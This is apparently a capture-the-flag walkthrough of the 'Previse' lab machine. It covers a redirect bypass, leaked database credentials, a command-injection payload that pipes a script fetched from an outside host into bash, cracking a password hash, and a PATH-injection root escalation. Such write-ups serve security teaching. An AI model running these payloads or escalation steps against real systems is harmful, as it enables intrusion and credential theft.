Site seems related to file storage. Trying some common username and passwords, but didn't work. Running ffuf for brute forcing directories, we found

```
Most of the pages gives 302 status code. We found `nav.php` with status code 200, means its not redirecting to other pages. Navigating to it
![image](https://user-images.githubusercontent.com/43528306/128631516-4abbaa83-1280-49df-be38-ad5a998941c3.png)

The page has a option to create an account, but `/account.php` was redirecting to `login.php`. Looking at response from each page using burp, 
we found that on pages which gave 302 redirect were having the wole page in the respones. This vulnerability is known as [Execution After redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))

Here, we can skip the redirects by changing the status code from *302 Found* to *200 OK*. Using this knowledge, we can create a account on the site. We just need to follow these steps:
- Click on create account, Intercept the request
- Intercept the response from server
- Change status code from 302 to 200 OK

We now have a full working registration page, which allows us to create new account using which we can login to site.

On the *files* page, we found a zip file named `siteBackup.zip` which we can download. The zip archive contained the source code of the website.

![image](https://user-images.githubusercontent.com/94787830/148672321-0179b06c-b880-4734-b105-9999678a271d.png)

Looking at `config.php`, we found credentials for mysql.
```php
function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}
```
We have the credentials, but mysql port was not open. We could try using this password and user `m4lwhere` (found on website footer),to login. But no success.

### Command Injection

Looking at other files, the `logs.php` file was interesting. The page allow us to download log files from server with our choice of delemiter.
But the backend code was not sanitizing  *delim* parameter, and using it directly in PHP `exec()` function which makes it vulnerable to Command Injection.
```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```
Fuzzing this endpoint, we found that web app was vulnerable to blind command injection. 
Using `delim=comma;curl 10.10.14.64:8000/test.sh|bash` as delimeter, we were able to get shell on the box.

## Shell as www-data
Looking at running services, we found that MySQL was running. Using the previously found credentials from `config.php`, we can connect to MySQL.
```bash
$ mysql -u root -p
Enter password: 

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
mysql> use previse;

+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)
```
The table contained hash for user `m4lwhere`
```
m4lwhere: $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.
```
We can crack the hash either by using *Hashcat* or *John the Ripper*.

```bash
hashcat -m 500 hash /usr/share/wordlists/rockyou.txt

$1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!

We can ssh into the box using the credentials.

## ROOT
Checking sudo permissions
```bash
m4lwhere@previse:~$ sudo -l                                                         
[sudo] password for m4lwhere:                                                       
User m4lwhere may run the following commands on previse:                            
    (root) /opt/scripts/access_backup.sh
```
Looking at the script
```bash
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

The script was used to make backup, but it was using `gzip` without complete path which makes it vulnerable to *PATH Injection*. 

### Exploiting PATH Injection
To exploit it, Lets create a malicious script in `tmp` folder.
Script will be used to set suid bit on bash. After which, add `/tmp` to our path, and executing the script
```bash
m4lwhere@previse:/tmp$ cat gzip 
chmod +xs /bin/bash
m4lwhere@previse:/tmp$ chmod +x gzip 
m4lwhere@previse: PATH=.:$PATH
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh 
m4lwhere@previse:/tmp$ ls -al /bin/bash 
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash

m4lwhere@previse:/tmp$ bash -p

bash-4.4# whoami
root
```
